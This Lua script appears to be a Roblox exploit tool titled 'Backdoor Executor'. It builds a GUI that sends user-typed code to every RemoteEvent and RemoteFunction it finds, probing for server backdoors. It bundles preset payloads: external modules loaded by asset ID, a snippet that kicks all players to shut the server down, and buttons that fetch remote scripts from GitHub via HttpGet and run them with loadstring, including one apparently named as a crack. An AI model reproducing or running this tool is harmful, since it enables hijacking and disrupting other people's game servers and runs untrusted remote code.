-- Open Source
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local player = Players.LocalPlayer

local function FireButtonClickSound()
local sound = Instance.new("Sound")

sound.SoundId = "rbxassetid://6042053626"
sound.Volume = 1
sound.Name = "ButtonClickSound"
sound.Parent = workspace
sound:Play()
end

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "BackdoorExecutor"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 550, 0, 300)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
MainFrame.BorderSizePixel = 0
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Active = true
MainFrame.Draggable = true
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)

local FloatButton = Instance.new("ImageButton", ScreenGui)
FloatButton.Name = "FloatToggleButton"
FloatButton.Size = UDim2.new(0, 50, 0, 50)
FloatButton.Position = UDim2.new(1, -60, 0, 50)
FloatButton.AnchorPoint = Vector2.new(1, 0)
FloatButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
FloatButton.BackgroundTransparency = 0.3
FloatButton.BorderSizePixel = 0
FloatButton.AutoButtonColor = true
FloatButton.Image = "rbxassetid://73002885569080"
FloatButton.Active = true
FloatButton.Draggable = true
Instance.new("UICorner", FloatButton).CornerRadius = UDim.new(0, 8)

local menuVisible = true
FloatButton.MouseButton1Click:Connect(function()
	menuVisible = not menuVisible
	MainFrame.Visible = menuVisible
	FireButtonClickSound()
end)

local TabBar = Instance.new("Frame", MainFrame)
TabBar.Size = UDim2.new(0, 50, 1, 0)
TabBar.Position = UDim2.new(0, 0, 0, 0)
TabBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Instance.new("UICorner", TabBar).CornerRadius = UDim.new(0, 10)

local Divider = Instance.new("Frame", MainFrame)
Divider.Size = UDim2.new(0, 1, 1, 0)
Divider.Position = UDim2.new(0, 50, 0, 0)
Divider.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Divider.BorderSizePixel = 0

local ContentFrame = Instance.new("Frame", MainFrame)
ContentFrame.Size = UDim2.new(1, -51, 1, 0)
ContentFrame.Position = UDim2.new(0, 51, 0, 0)
ContentFrame.BackgroundTransparency = 1

local Title = Instance.new("TextLabel", ContentFrame)
Title.Size = UDim2.new(1, -90, 0, 40)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = " Backdoor Executor"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextXAlignment = Enum.TextXAlignment.Left
local originalTitlePos = Title.Position

local CloseButton = Instance.new("TextButton", ContentFrame)
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Position = UDim2.new(1, -35, 0, 5)
CloseButton.BackgroundTransparency = 1
CloseButton.Text = "X"
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 20
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
	FireButtonClickSound()
end)

local MinimizeButton = Instance.new("TextButton", ContentFrame)
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Position = UDim2.new(1, -70, 0, 5)
MinimizeButton.BackgroundTransparency = 1
MinimizeButton.Text = "—"
MinimizeButton.Font = Enum.Font.GothamBold
MinimizeButton.TextSize = 24
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)

local originalSize = MainFrame.Size
local minimized = false
local originalVisibility = {}

local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local minimizedSize = UDim2.new(originalSize.X.Scale, originalSize.X.Offset, 0, 40)
local minimizedTitlePos = UDim2.new(0, -ContentFrame.Position.X.Offset + 5, 0, 0)

MinimizeButton.MouseButton1Click:Connect(function()
	minimized = not minimized

	if minimized then
		for _, obj in pairs(ContentFrame:GetChildren()) do
			if obj:IsA("GuiObject") and obj ~= Title and obj ~= MinimizeButton and obj ~= CloseButton then
				originalVisibility[obj] = obj.Visible
				obj.Visible = false
			end
		end
		originalVisibility[TabBar] = TabBar.Visible
		originalVisibility[Divider] = Divider.Visible
		TabBar.Visible = false
		Divider.Visible = false

		TweenService:Create(MainFrame, tweenInfo, {Size = minimizedSize}):Play()
		TweenService:Create(Title, tweenInfo, {Position = minimizedTitlePos}):Play()

		MinimizeButton.Text = "+"
		FireButtonClickSound()
	else
		for obj, wasVisible in pairs(originalVisibility) do
			if obj and obj.Parent then
				obj.Visible = wasVisible
			end
		end

		TweenService:Create(MainFrame, tweenInfo, {Size = originalSize}):Play()
		TweenService:Create(Title, tweenInfo, {Position = originalTitlePos}):Play()

		MinimizeButton.Text = "—"
		FireButtonClickSound()
	end
end)

local TextBox = Instance.new("TextBox", ContentFrame)
TextBox.Position = UDim2.new(0.05, 0, 0.2, 0)
TextBox.Size = UDim2.new(0.9, 0, 0.5, 0)
TextBox.PlaceholderText = 'Enter a Code Here!'
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
TextBox.ClearTextOnFocus = false
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.Font = Enum.Font.Code
TextBox.TextSize = 16
TextBox.MultiLine = true
Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 8)

local function createButton(text, position)
	local button = Instance.new("TextButton", ContentFrame)
	button.Size = UDim2.new(0.4, 0, 0, 35)
	button.Position = position
	button.Text = text
	button.Font = Enum.Font.GothamMedium
	button.TextSize = 16
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
	return button
end

local ExecuteButton = createButton(" Execute", UDim2.new(0.05, 0, 0.78, 0))
local ClearButton = createButton(" Clear", UDim2.new(0.55, 0, 0.78, 0))

local lugares = {
	game:GetService("Workspace"), game:GetService("Lighting"),
	game:GetService("ReplicatedStorage"), game:GetService("StarterGui"),
	game:GetService("StarterPlayer"), game:GetService("StarterPack"),
	game:GetService("Players"), game:GetService("Teams"),
	game:GetService("Chat"), game:GetService("SoundService"),
	game:GetService("CoreGui")
}

local function notify(title, text)
	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = title,
			Text = text,
			Duration = 3
		})
	end)
end

local ConsolePanel = Instance.new("ScrollingFrame", ContentFrame)
ConsolePanel.Size = UDim2.new(1, -20, 0.6, 0)
ConsolePanel.Position = UDim2.new(0, 10, 0.25, 0)
ConsolePanel.Visible = false
ConsolePanel.BackgroundTransparency = 1
ConsolePanel.ScrollBarThickness = 4
ConsolePanel.CanvasSize = UDim2.new(0, 0, 0, 0)
ConsolePanel.AutomaticCanvasSize = Enum.AutomaticSize.Y

local ConsoleLayout = Instance.new("UIListLayout", ConsolePanel)
ConsoleLayout.SortOrder = Enum.SortOrder.LayoutOrder
ConsoleLayout.Padding = UDim.new(0, 2)

local function logToConsole(prefix, text, color)
	local label = Instance.new("TextLabel", ConsolePanel)
	label.Text = "["..prefix.."] "..text
	label.TextColor3 = color
	label.Font = Enum.Font.Code
	label.TextSize = 16
	label.TextXAlignment = Enum.TextXAlignment.Left
	label.BackgroundTransparency = 1
	label.Size = UDim2.new(1, -10, 0, 20)
end

local TweenService = game:GetService("TweenService")

local buttonCache = {}

local function animateClick(button)
	if not buttonCache[button] then
		buttonCache[button] = {
			Position = button.Position,
			Size = button.Size
		}
	end

	local original = buttonCache[button]  

	local pressTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {  
		Position = original.Position + UDim2.new(0, 0, 0, 2),  
		Size = original.Size - UDim2.new(0, 0, 0, 2)  
	})  

	local releaseTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {  
		Position = original.Position,  
		Size = original.Size  
	})  

	pressTween:Play()  
	pressTween.Completed:Connect(function()  
		releaseTween:Play()  
	end)
end

ExecuteButton.MouseButton1Click:Connect(function()
    FireButtonClickSound()
    animateClick(ExecuteButton)
	logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))
	local code = TextBox.Text
	if code == "" then
		notify("Error", "No code provided")
		return
	end
	local enviados = 0
	for _, localBase in ipairs(lugares) do
		for _, obj in ipairs(localBase:GetDescendants()) do
			if obj:IsA("RemoteEvent") then
				pcall(function()
					obj:FireServer(code)
					enviados += 1
				end)
			elseif obj:IsA("RemoteFunction") then
				pcall(function()
					obj:InvokeServer(code)
					enviados += 1
				end)
			end
		end
	end
end)

ClearButton.MouseButton1Click:Connect(function()
    FireButtonClickSound()
    animateClick(ClearButton)
	TextBox.Text = ""
	notify("Success", "Successfully Cleared")
	logToConsole("INFO", "Textbox Cleared", Color3.fromRGB(255, 255, 255))
end)

local ScriptPanel = Instance.new("ScrollingFrame", ContentFrame)
ScriptPanel.Size = UDim2.new(1, -20, 0.7, 0)
ScriptPanel.Position = UDim2.new(0, 10, 0.2, 0)
ScriptPanel.Name = "ScriptPanel"
ScriptPanel.Visible = false
ScriptPanel.BackgroundTransparency = 1
ScriptPanel.ScrollBarThickness = 4
ScriptPanel.CanvasSize = UDim2.new(0, 0, 0, 0)
ScriptPanel.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScriptPanel.ClipsDescendants = true

local ScriptLayout = Instance.new("UIListLayout", ScriptPanel)
ScriptLayout.SortOrder = Enum.SortOrder.LayoutOrder
ScriptLayout.Padding = UDim.new(0, 5)

local function SetActiveTab(tab)
	TextBox.Visible = false
	ExecuteButton.Visible = false
	ClearButton.Visible = false
	ScriptPanel.Visible = false
	ConsolePanel.Visible = false

	if tab == "executor" then
		TextBox.Visible = true
		ExecuteButton.Visible = true
		FireButtonClickSound()
		ClearButton.Visible = true
		FireButtonClickSound()
	elseif tab == "scripts" then
		ScriptPanel.Visible = true
		FireButtonClickSound()
	elseif tab == "console" then
		ConsolePanel.Visible = true
		FireButtonClickSound()
	end
end

local TweenService = game:GetService("TweenService")

local buttonCache = {}

local function animateClick(button)
	if not buttonCache[button] then
		buttonCache[button] = {
			Position = button.Position,
			Size = button.Size
		}
	end

	local original = buttonCache[button]  

	local pressTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {  
		Position = original.Position + UDim2.new(0, 0, 0, 2),  
		Size = original.Size - UDim2.new(0, 0, 0, 2)  
	})  

	local releaseTween = TweenService:Create(button, TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {  
		Position = original.Position,  
		Size = original.Size  
	})  

	pressTween:Play()  
	pressTween.Completed:Connect(function()  
		releaseTween:Play()  
	end)
end

_G.AddSection = function(text)
	local label = Instance.new("TextLabel", ScriptPanel)
	label.Size = UDim2.new(1, 0, 0, 25)
	label.Text = text
	label.Font = Enum.Font.GothamBold
	label.TextSize = 18
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.BackgroundTransparency = 1
end

_G.AddButton = function(text, code)
	local button = Instance.new("TextButton", ScriptPanel)
	button.Size = UDim2.new(1, 0, 0, 30)
	button.Text = text
	button.Font = Enum.Font.Gotham
	button.TextSize = 16
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
	
	button.MouseButton1Click:Connect(function()
		SetActiveTab("executor")
		TextBox.Text = code
	end)
end

_G.LocalScriptButton = function(text, func)
	local button = Instance.new("TextButton", ScriptPanel)
	button.Size = UDim2.new(1, 0, 0, 30)
	button.Text = text
	button.Font = Enum.Font.Gotham
	button.TextSize = 16
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseButton1Click:Connect(function()
	    logToConsole("SUCCESS", "Script Executed", Color3.fromRGB(100, 255, 100))
    	FireButtonClickSound()
		animateClick(button)
		func()
	end)
end

local function createTabButton(order, callback, imageId)
	local tab = Instance.new("ImageButton", TabBar)
	tab.Size = UDim2.new(1, 0, 0, 50)
	tab.Position = UDim2.new(0, 0, 0, order * 50)
	tab.Image = "rbxassetid://"..imageId
	tab.BackgroundTransparency = 1
	tab.MouseButton1Click:Connect(callback)
end

createTabButton(0, function() SetActiveTab("executor") end, 133432695793267)
createTabButton(1, function() SetActiveTab("scripts") end, 91156715735899)
createTabButton(2, function() SetActiveTab("console") end, 72275937634892)

SetActiveTab("executor")

_G.AddSection("Server Side Scripts")

_G.AddButton("Sensation Hub", 'require(100263845596551)("'..LocalPlayer.Name..'", ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")')

_G.AddButton("R6 Convert", 'require(3436957371):r6("' .. LocalPlayer.Name .. '")')

_G.AddButton("Grab Knife V4 (R6 Only)", 'require(18665717275).load("' .. LocalPlayer.Name .. '")')

_G.AddButton("C4 Bomb", 'require(0x1767bf813)("' .. LocalPlayer.Name .. '")')

_G.AddButton("Shutdown Server", [[
for _, v in pairs(game.Players:GetPlayers()) do
    v:Kick("Server has Shutdown")
end
]])

_G.AddButton("Hint", [[
Instance.new("Hint", workspace).Text = "Text Here"
]])

_G.AddSection("Client Side Scripts")

_G.LocalScriptButton("Infinite Yield", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

_G.LocalScriptButton("Fly GUI V3", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
end)

_G.LocalScriptButton("Keyboard", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
end)

logToConsole("WELCOME", "Welcome to Console!", Color3.fromRGB(0, 255, 255))
